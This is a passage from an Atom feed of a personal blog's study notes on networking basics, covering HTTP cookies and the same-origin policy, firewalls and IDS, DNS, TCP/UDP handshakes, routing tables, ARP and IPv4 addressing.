&lt;span class="nv"&gt;depth&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="nv"&gt;C&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; US, &lt;span class="nv"&gt;O&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; Let&lt;span class="s1"&gt;&amp;#39;s Encrypt, CN = Let&amp;#39;&lt;/span&gt;s Encrypt Authority X3
verify &lt;span class="k"&gt;return&lt;/span&gt;:1
&lt;span class="nv"&gt;depth&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="nv"&gt;CN&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; blog.smigiel.dev
verify &lt;span class="k"&gt;return&lt;/span&gt;:1
HEAD / HTTP/1.1
Host: blog.smigiel.dev

HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
Connection: keep-alive
Content-Length: &lt;span class="m"&gt;30082&lt;/span&gt;
Server: GitHub.com
Content-Type: text/html&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;charset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;utf-8
Last-Modified: Wed, &lt;span class="m"&gt;30&lt;/span&gt; Sep &lt;span class="m"&gt;2020&lt;/span&gt; &lt;span class="m"&gt;03&lt;/span&gt;:07:04 GMT
ETag: &lt;span class="s2"&gt;&amp;quot;5f73f658-7582&amp;quot;&lt;/span&gt;
Access-Control-Allow-Origin: *
Expires: Fri, &lt;span class="m"&gt;02&lt;/span&gt; Oct &lt;span class="m"&gt;2020&lt;/span&gt; &lt;span class="m"&gt;01&lt;/span&gt;:14:17 GMT
Cache-Control: max-age&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;600&lt;/span&gt;
X-Proxy-Cache: MISS
X-GitHub-Request-Id: 376E:4248:1F613:26B71:5F767C91
Accept-Ranges: bytes
Date: Fri, &lt;span class="m"&gt;02&lt;/span&gt; Oct &lt;span class="m"&gt;2020&lt;/span&gt; &lt;span class="m"&gt;02&lt;/span&gt;:57:10 GMT
Via: &lt;span class="m"&gt;1&lt;/span&gt;.1 varnish
Age: &lt;span class="m"&gt;49&lt;/span&gt;
X-Served-By: cache-pao17443-PAO
X-Cache: HIT
X-Cache-Hits: &lt;span class="m"&gt;1&lt;/span&gt;
X-Timer: S1601607430.114992,VS0,VE1
Vary: Accept-Encoding
X-Fastly-Request-ID: b902c4a5a2f4410e8e6ac21e60fa2e659f1e8300
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;HTTP Cookies&lt;/h2&gt;
&lt;p&gt;HTTP is stateless protocol. It means, that website cannot keep the state of a visit across different HTTP requests. Every HTTP request is unrelated to others.
To change this situation, &lt;a href="https://en.wikipedia.org/wiki/HTTP_cookie"&gt;cookies&lt;/a&gt; were introduced.&lt;/p&gt;
&lt;p&gt;Cookies are textual information installed by a website into web browser. Server can set a cookie using &lt;strong&gt;Set-Cookie&lt;/strong&gt; header field.&lt;/p&gt;
&lt;h3&gt;Cookie fields&lt;/h3&gt;
&lt;p&gt;Cookies are only sent to the valid domain and path when they are not expired and according to their flags.
The domain field and the path field set the scope of the cookie. The browser sends the cookie only if the request is for the right domain.
If the server does not specify domain attribute, the browser will automatically set the domain as the server domain and set the cookie &lt;strong&gt;host-only&lt;/strong&gt; flag. It means that the cookie will be sent only to that precise hostname.&lt;/p&gt;
&lt;h3&gt;Cookie protocol&lt;/h3&gt;
&lt;p&gt;Cookies are usually set during a login. Browser sends &lt;strong&gt;POST&lt;/strong&gt; request to the server, and the server responds with a &lt;strong&gt;Set-Cookie&lt;/strong&gt; header field.
For every subsequent request, the browser considers domain, path, expiration and flags. If all checks pass, the browser will insert a &lt;strong&gt;cookie:&lt;/strong&gt; header in the request.&lt;/p&gt;
&lt;h2&gt;Sessions&lt;/h2&gt;
&lt;p&gt;Sessions mechanism works similar to cookies. The difference here relies on the way how the information is stored. Session is kept on &lt;em&gt;server-side&lt;/em&gt;. Each user session is identified by a &lt;strong&gt;session id&lt;/strong&gt; which the server assigns to the user. The client then presents its &lt;strong&gt;ID&lt;/strong&gt; for each subsequent request, thus being recognized by the server. The server retrieves the state of the client and all its associated variables.&lt;/p&gt;
&lt;h2&gt;Same-Origin Policy (SOP)&lt;/h2&gt;
&lt;p&gt;Same-Origin Policy prevents JavaScript code from getting or setting properties on a resource comming from a &lt;strong&gt;different origin&lt;/strong&gt;. To determine if JavaScript can access a resource &lt;em&gt;hostname&lt;/em&gt;, &lt;em&gt;port&lt;/em&gt; and &lt;em&gt;protocol&lt;/em&gt; must match.
SOP applies only to the actual code. It is still possible to include external resources by other HTML tags like &lt;code&gt;img&lt;/code&gt;, &lt;code&gt;script&lt;/code&gt;, &lt;code&gt;iframe&lt;/code&gt;, &lt;code&gt;object&lt;/code&gt;, etc.&lt;/p&gt;
&lt;h1&gt;Additional resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods"&gt;HTTP request methods&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status"&gt;HTTP response status codes - Mozilla&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/List_of_HTTP_status_codes"&gt;HTTP response status codes - Wikipedia&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.tcpipguide.com/free/t_HTTPOverviewHistoryVersionsandStandards.htm"&gt;HTTP Overview, history, versions, standards&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies"&gt;HTTP Cookie - Mozilla&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/HTTP_cookie"&gt;HTTP Cookie - Wikipedia&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://tools.ietf.org/html/rfc6265"&gt;HTTP State management mechanism - RFC6265&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="misc"></category><category term="learning"></category><category term="pts"></category><category term="http"></category></entry><entry><title>Networking Pt 4</title><link href="https://blog.smigiel.dev/networking-pt-4.html" rel="alternate"></link><published>2020-09-23T00:00:00-07:00</published><updated>2020-09-23T00:00:00-07:00</updated><author><name>dasm</name></author><id>tag:blog.smigiel.dev,2020-09-23:/networking-pt-4.html</id><summary type="html">&lt;h1&gt;Firewall&lt;/h1&gt;
&lt;p&gt;Firewalls are specialized software modules running on a computer or a dedicated network device. They serve to filter packets coming in and out of a network. They can work on different layers of the OSI model.&lt;/p&gt;
&lt;h2&gt;Packet filtering&lt;/h2&gt;
&lt;p&gt;The most basic feature of a firewall is packet filtering. Administrator â€¦&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Firewall&lt;/h1&gt;
&lt;p&gt;Firewalls are specialized software modules running on a computer or a dedicated network device. They serve to filter packets coming in and out of a network. They can work on different layers of the OSI model.&lt;/p&gt;
&lt;h2&gt;Packet filtering&lt;/h2&gt;
&lt;p&gt;The most basic feature of a firewall is packet filtering. Administrator can create rules which will filter packets according to certain characteristics like:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;source IP address&lt;/li&gt;
&lt;li&gt;destination IP address&lt;/li&gt;
&lt;li&gt;protocol&lt;/li&gt;
&lt;li&gt;source port&lt;/li&gt;
&lt;li&gt;destination port&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Common actions, that can be applied:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;allow: allow the packet to pass&lt;/li&gt;
&lt;li&gt;drop: drops the packet without any diagnostic message to the packet source host&lt;/li&gt;
&lt;li&gt;deny: similar to drop, but notify the source host&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Inspecting the header of a packet does not give you any information on the content. Even if only port &lt;code&gt;80&lt;/code&gt; or &lt;code&gt;443&lt;/code&gt; is allowed, attacker can exploit them, to access deeper levels of network.&lt;/p&gt;
&lt;h2&gt;Application level firewalls&lt;/h2&gt;
&lt;p&gt;Application level firewall works by checking all 7 layers of the OSI model. They provide more comprehensive protection because they inspect the actual content of a packet, not just headers.&lt;/p&gt;
&lt;h2&gt;Intrusion Detection System (IDS)&lt;/h2&gt;
&lt;p&gt;IDS inspects the application payload trying to detect any potential attack. It checks for attack vectors like ping sweeps, port scans, SQL injections, buffer overflows etc.
IDS, similar to antivirus, detects risky traffic by means of signatures. The vendor provides frequent signature updates as soon as new attack vectors are found. Without the right signatures an IDS cannot detect and report an intrusion.
There is also risk of &lt;strong&gt;false positives&lt;/strong&gt; when legic traffic is marked as malicious.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;IDS != firewall&lt;/code&gt;
IDS is another layer of protection, which can be used in conjunction with firewall.&lt;/p&gt;
&lt;h2&gt;Intrusion Prevention System (IPS)&lt;/h2&gt;
&lt;p&gt;It is similar to IDS, however it can drop malicious request when the threat has risk classification above predefined threshold.&lt;/p&gt;
&lt;h1&gt;Domain Name System (DNS)&lt;/h1&gt;
&lt;p&gt;The DNS converts human-readable names to IP addresses.
DNS structure can be broken down into:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;top level domain (TLD)&lt;/li&gt;
&lt;li&gt;domain part&lt;/li&gt;
&lt;li&gt;subdomain part (if applicable)&lt;/li&gt;
&lt;li&gt;host part&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Name resolution is performed by resolvers. Resolvers are servers that contact the TLD server and follow the hierarchy of the DNS name to resolve the name of a host:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;resolver contacts one of the &lt;strong&gt;root name servers&lt;/strong&gt;, these server contain information about the TLD (this information is hardcoded by system administrator);&lt;/li&gt;
&lt;li&gt;next, it asks the TLD name server (from previous step), what's the name of the server which can give information about the &lt;strong&gt;domain&lt;/strong&gt; the resolver is looking for;&lt;/li&gt;
&lt;li&gt;if there are one or more subdomains, previous step is repeated for every subdomain;&lt;/li&gt;
&lt;li&gt;resolver asks for the name resolution of the &lt;strong&gt;host&lt;/strong&gt; part;&lt;/li&gt;
&lt;li&gt;the resolver sends the IP address back to the client.&lt;/li&gt;
&lt;/ol&gt;</content><category term="misc"></category><category term="learning"></category><category term="pts"></category><category term="network"></category></entry><entry><title>Networking Pt 3: TCP and UDP</title><link href="https://blog.smigiel.dev/networking-pt-3-tcp-and-udp.html" rel="alternate"></link><published>2020-09-21T00:00:00-07:00</published><updated>2020-09-21T00:00:00-07:00</updated><author><name>dasm</name></author><id>tag:blog.smigiel.dev,2020-09-21:/networking-pt-3-tcp-and-udp.html</id><summary type="html">&lt;h1&gt;TCP &amp;amp; UDP&lt;/h1&gt;
&lt;p&gt;There are two common transport protocols used on the Internet: &lt;code&gt;TCP&lt;/code&gt; (Transmission Control Protocol) and &lt;code&gt;UDP&lt;/code&gt; (User Datagram Protocol).
TCP is the most used transport protocol on the Internet. The vast majority of applications use it, and the IP protocol suite is often called &lt;strong&gt;TCP/IP&lt;/strong&gt;.
UDP is â€¦&lt;/p&gt;</summary><content type="html">&lt;h1&gt;TCP &amp;amp; UDP&lt;/h1&gt;
&lt;p&gt;There are two common transport protocols used on the Internet: &lt;code&gt;TCP&lt;/code&gt; (Transmission Control Protocol) and &lt;code&gt;UDP&lt;/code&gt; (User Datagram Protocol).
TCP is the most used transport protocol on the Internet. The vast majority of applications use it, and the IP protocol suite is often called &lt;strong&gt;TCP/IP&lt;/strong&gt;.
UDP is much simpler. It doesn't guarantee packet delivery and it is conectionless. Thanks to those features, it is much faster than TCP, it provides better throughput. It is often used by multimedia applications that can tolerate packet loss but are througput intensive. It is often used in VoIP and video streaming applications where you can tolerate a little glitch in the audio or video.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;TCP&lt;/th&gt;
&lt;th&gt;UDP&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Connection oriented protocol&lt;/td&gt;
&lt;td&gt;Connectionless&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Rearranges data packets in the order specified&lt;/td&gt;
&lt;td&gt;No inherent order as all packets are independent of each other.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Slower speed than UDP&lt;/td&gt;
&lt;td&gt;UDP is faster, because error recovery is not attepmted. It is "best effort" protocol&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Data is read as byte stream, no distinguishing information is sent to signal message boundaries&lt;/td&gt;
&lt;td&gt;Packets are sent individually and are checked for integrity only when they arrive. Packets have definite boundaries, meaning a read operation at the receiver socket will yield an entire message as it was originally sent.&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2&gt;Ports&lt;/h2&gt;
&lt;p&gt;Ports are used to identify a single network process on a machine. When some process is establishing connection to external internet resource (browser -&amp;gt; website), there is port open, associated with browser. Information about the port is later sent as part of header in TCP or UDP packet. In the case of aforementioned connection, &lt;code&gt;source port&lt;/code&gt; would be the same, that was created for browser. &lt;code&gt;Destination port&lt;/code&gt; then is associeated with website (usually &lt;code&gt;80&lt;/code&gt; or &lt;code&gt;443&lt;/code&gt;).
This is the way how process know where information needs to be addressed.&lt;/p&gt;
&lt;h2&gt;TCP handshake&lt;/h2&gt;
&lt;p&gt;In the case of UDP, which is connectionless, there is no handshake. However, for TCP, before any kind of transmission can happen, there needs to be established connection.
It is done in so called three-way handshake.
The header fields involved in the handshake are: sequence number, acknowledgement numbers, SYN and ACK flags&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;The client sends a TCP packet to the server with the &lt;code&gt;SYN&lt;/code&gt; flag enabled and a random &lt;code&gt;sequence number&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;The server replies by sending a packet with both the &lt;code&gt;SYN&lt;/code&gt; and &lt;code&gt;ACK&lt;/code&gt; flags. &lt;code&gt;Sequence number&lt;/code&gt; is again chosen as random, but &lt;code&gt;ACK&lt;/code&gt; is &lt;code&gt;seq number + 1&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;The client completes the synchronization by sending an &lt;code&gt;ACK&lt;/code&gt; packet. The &lt;code&gt;ACK&lt;/code&gt; is &lt;code&gt;seq number + 1&lt;/code&gt; and &lt;code&gt;sequence number&lt;/code&gt; is &lt;code&gt;ACK + 1&lt;/code&gt; from the second step.&lt;/li&gt;
&lt;/ol&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;Host&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;flags&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="k"&gt;Host&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;
&lt;span class="c1"&gt;-------|-------|--------&lt;/span&gt;
&lt;span class="c1"&gt;-----&amp;gt; |SYN    |&lt;/span&gt;
    &lt;span class="n"&gt;Seq&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;328&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ACK&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;

       &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;SYN&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;ACK&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="c1"&gt;------&lt;/span&gt;
    &lt;span class="n"&gt;Seq&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;412&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ACK&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;329&lt;/span&gt;

&lt;span class="c1"&gt;------&amp;gt;|ACK    |&lt;/span&gt;
    &lt;span class="n"&gt;Seq&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;330&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ACK&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;413&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Additional resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.diffen.com/difference/TCP_vs_UDP"&gt;TCP vs UDP&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.lifewire.com/port-numbers-on-computer-networks-817939"&gt;Port numbers on a computer&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="misc"></category><category term="learning"></category><category term="pts"></category><category term="network"></category></entry><entry><title>Networking Pt 2</title><link href="https://blog.smigiel.dev/networking-pt-2.html" rel="alternate"></link><published>2020-09-19T00:00:00-07:00</published><updated>2020-09-19T00:00:00-07:00</updated><author><name>dasm</name></author><id>tag:blog.smigiel.dev,2020-09-19:/networking-pt-2.html</id><summary type="html">&lt;h1&gt;Routing&lt;/h1&gt;
&lt;p&gt;A router is a networking device that forwards data packets between computer networks. A router os connected to two or more data lines from different IP networks. When a data packet comes in one of the lines, the router reads the network address information in the packet header to â€¦&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Routing&lt;/h1&gt;
&lt;p&gt;A router is a networking device that forwards data packets between computer networks. A router os connected to two or more data lines from different IP networks. When a data packet comes in one of the lines, the router reads the network address information in the packet header to determine the destination. Then, based on routing table, it directs the packet to the next network.
Routing table contains information about the topology of the network immediately around it.
The table can also contain an entry with the &lt;strong&gt;default address&lt;/strong&gt; &lt;code&gt;0.0.0.0&lt;/code&gt;. This entry is used when the router receives a packet whose destination is an &lt;em&gt;unknown network&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Routing table example (router)&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;Kernel IP routing table&lt;/span&gt;
&lt;span class="err"&gt;Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface&lt;/span&gt;
&lt;span class="err"&gt;87.169.144.1    0.0.0.0         255.255.255.255 UH        0 0          0 eth0&lt;/span&gt;
&lt;span class="err"&gt;192.168.1.0     0.0.0.0         255.255.255.0   U         0 0          0 br0&lt;/span&gt;
&lt;span class="err"&gt;87.169.144.0    0.0.0.0         255.255.252.0   U         0 0          0 eth0&lt;/span&gt;
&lt;span class="err"&gt;127.0.0.0       0.0.0.0         255.0.0.0       U         0 0          0 lo&lt;/span&gt;
&lt;span class="err"&gt;0.0.0.0         87.169.144.1    0.0.0.0         UG        0 0          0 eth0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The kernel reads routing table from the top down. The first column is the destination. The second column tells how to reach that destination.
The default gateway is always shown with the destination &lt;code&gt;0.0.0.0&lt;/code&gt;. The IP address in the gateway column is that of the outbound gateway router. The netmask for the default gateway means that any packet not addressed to the local network or another outbound router by additional entries in the routing table are to be sent to the default gateway regardless of the network class.&lt;/p&gt;
&lt;h1&gt;Networking Layer 2&lt;/h1&gt;
&lt;p&gt;Every host on a network has both an IP and a MAC address. When server A wants to send a packet to server B:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;server A creates a packet:&lt;ul&gt;
&lt;li&gt;the destination IP address of server B in the IP header of the datagram.&lt;/li&gt;
&lt;li&gt;the destination MAC address of the router in the link layer header of the frame.&lt;/li&gt;
&lt;li&gt;the source IP address of the server A.&lt;/li&gt;
&lt;li&gt;the source MAC address of the server A.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;router takes a packet and forwards it to server B (the destination MAC address is the MAC address of the &lt;strong&gt;next hop&lt;/strong&gt;):&lt;ul&gt;
&lt;li&gt;the destination MAC address is rewritten to server B&lt;/li&gt;
&lt;li&gt;the source MAC address is of router.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Only MAC address is changed. IP address stays the same (both source and destination)&lt;/strong&gt;. This is global information and remains the same along the packet trip.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;MAC address&lt;/h2&gt;
&lt;p&gt;MAC address is a unique identifier assigned to a network interface controller (NIC). It is assigned by device manufacturer: typically includes a manufacturer's organizationally unique identifier. MAC address is 48 bit (6 bytes) long and is expressed in hexadecimal form: &lt;code&gt;AA:BB:CC:DD:EE:FF&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The IEEE has built in special address to allow more than one NIC to be addressed at one time. It's called broadcast address: &lt;code&gt;FF:FF:FF:FF:FF:FF&lt;/code&gt;. Frame with this address is delivered to all devices in the local network.&lt;/p&gt;
&lt;h2&gt;Network segmentation&lt;/h2&gt;
&lt;p&gt;Switches do not segment networks. Only routers do so. Usually, every interface of a router is connected to different network. This is the reason, why routers &lt;strong&gt;do not forward broadcast packets&lt;/strong&gt;, like switches.&lt;/p&gt;
&lt;h2&gt;Packet forwarding&lt;/h2&gt;
&lt;p&gt;To forward a packet:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;the switch reads the destination MAC address of the frame.&lt;/li&gt;
&lt;li&gt;it performs a look-up in the CAM table.&lt;/li&gt;
&lt;li&gt;it forwads the packet to the corresponding interface.&lt;/li&gt;
&lt;li&gt;if there is no entry with the MAC address, the switch will forward the frame to all its interfaces.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Address Resolution Protocol (ARP)&lt;/h2&gt;
&lt;p&gt;The ARP is a communication protocol used for discovering the link layer address, such as a MAC address, associated with a given internet layer address, typically an IPv4 address.&lt;/p&gt;
&lt;h3&gt;Example of workflow&lt;/h3&gt;
&lt;p&gt;Two computers are connected to the same local network. Computer A wants to send packet to Computer B. Through DNS, it determines Computer B &lt;strong&gt;IP address&lt;/strong&gt; &lt;code&gt;192.168.0.2&lt;/code&gt;.
To send message, Computer A also requires MAC address.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Computer A retrieves cached information from ARP table for &lt;code&gt;192.168.0.2&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;if the cache didn't produce a result for IP address, Computer A sends broadcast ARP request message &lt;code&gt;FF:FF:FF:FF:FF:FF&lt;/code&gt;, requesting an answer for &lt;code&gt;192.168.0.2&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Based on retrieved information, Computer A sends packet with MAC adress and IP address.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ARP table has time-to-live (TTL) for every entry. When it expires, or on power off, host discards entries.&lt;/p&gt;
&lt;h1&gt;Additional resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Router_(computing)"&gt;Router&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/IP_routing"&gt;IP routing&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://tldp.org/LDP/nag2/x-087-2-iface.netstat.html"&gt;netstat command&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://opensource.com/business/16/8/introduction-linux-network-routing"&gt;Introduction to Linux network routing&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Mac_address"&gt;MAC address&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Address_Resolution_Protocol"&gt;ARP&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="misc"></category><category term="learning"></category><category term="pts"></category><category term="network"></category></entry><entry><title>Networking</title><link href="https://blog.smigiel.dev/networking.html" rel="alternate"></link><published>2020-09-17T00:00:00-07:00</published><updated>2020-09-17T00:00:00-07:00</updated><author><name>dasm</name></author><id>tag:blog.smigiel.dev,2020-09-17:/networking.html</id><summary type="html">&lt;h1&gt;Protocols&lt;/h1&gt;
&lt;h2&gt;What is packet&lt;/h2&gt;
&lt;p&gt;Every packet in every protocol has &lt;code&gt;Header&lt;/code&gt; (control information) and &lt;code&gt;Payload&lt;/code&gt; (user data) structure. The header has a protocol-specific structure: this ensures that the receiving host can correctly interpret the payload and handle the communication. The payload is the actual information. It could be something like â€¦&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Protocols&lt;/h1&gt;
&lt;h2&gt;What is packet&lt;/h2&gt;
&lt;p&gt;Every packet in every protocol has &lt;code&gt;Header&lt;/code&gt; (control information) and &lt;code&gt;Payload&lt;/code&gt; (user data) structure. The header has a protocol-specific structure: this ensures that the receiving host can correctly interpret the payload and handle the communication. The payload is the actual information. It could be something like part of an email message or the content of a file during a download.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://en.wikipedia.org/wiki/IPv4_packet#Header"&gt;IPv4 protocol header&lt;/a&gt; is at least 160 bits (20 bytes) long, and it includes 14 fields, of which 13 are required. Last field, called &lt;code&gt;options&lt;/code&gt; is optional.
&lt;img alt="IPv4 packet - Wikipedia" src="https://upload.wikimedia.org/wikipedia/commons/7/71/IPv4_Packet_-en.svg"&gt;
Source: Wikipedia, author &lt;a href="https://commons.wikimedia.org/w/index.php?title=User:MichelBakni&amp;amp;action=edit&amp;amp;redlink=1"&gt;MichelBakni&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Using the information in the header, the nodes involved in the communication can understand and use IP packets.&lt;/p&gt;
&lt;h2&gt;Protocol layers&lt;/h2&gt;
&lt;p&gt;Most of the time, when people talk about layers, they think about OSI model. OSI model promoted the idea of a consistent model of protocol layers, defining interoperability between network devices and software.
Based on that we can think about seven layers (&lt;a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/network/windows-network-architecture-and-the-osi-model"&gt;more here&lt;/a&gt;).  What we need to know is, that each protocol has &lt;code&gt;header&lt;/code&gt; and &lt;code&gt;payload&lt;/code&gt;. It goes from top to bottom. Every next layer is encapsulating the layer before in the form of payload.&lt;/p&gt;
&lt;h2&gt;Encapsulation&lt;/h2&gt;
&lt;p&gt;If we look from 10.000 foot perspective, we can see only data packet. However, if we look at this closer, it's starting showing some interesting properties.
Every layer contains paylod in a form of &lt;code&gt;header+payload&lt;/code&gt; from previous layer. It means, that at the lowest level, we're looking at&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;header&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;header&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;header&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;header&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;))))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This kind of behavior happens to every packet sent by host. On the other side of pipeline, receiving host, needs to unpack all the information, with regards to correct layers.&lt;/p&gt;
&lt;h1&gt;Internet Protocol (IP)&lt;/h1&gt;
&lt;h2&gt;IP Address&lt;/h2&gt;
&lt;h3&gt;IPv4 Address&lt;/h3&gt;
&lt;p&gt;IPv4 address consists of 4 bytes (octets). A dot delimits every octet in the address. Each byte (&lt;code&gt;2^8&lt;/code&gt;) can represent value &lt;strong&gt;0&lt;/strong&gt; to &lt;strong&gt;255&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt; 172.22.128.47&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;Special use IPv4 addresses&lt;/h4&gt;
&lt;p&gt;RFC5735 describes IPv4 addresses, which cannot be assigned to host, due to its special use case.
Common addresses, that are in use:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;127.0.0.0/8    &amp;lt;-- host loopback address.&lt;/span&gt;
&lt;span class="err"&gt;169.254.0.0/16 &amp;lt;-- communication between hosts, without DHCP server cannot be found.&lt;/span&gt;
&lt;span class="err"&gt;192.168.0.0/16 &amp;lt;-- private networks.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Network classes&lt;/h3&gt;
&lt;p&gt;Internet addresses are allocated by the InterNIC organization. The most common classes are A, B and C. D and E exist, but are not used by end users.
Each of classes has different default subnet mask.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Class A: uses 255.0.0.0 (CIDR /8) and have &lt;code&gt;0-127&lt;/code&gt; as first octet,&lt;/li&gt;
&lt;li&gt;Class B: uses 255.255.0.0 (CIDR /16) and have &lt;code&gt;128-191&lt;/code&gt; as first octet,&lt;/li&gt;
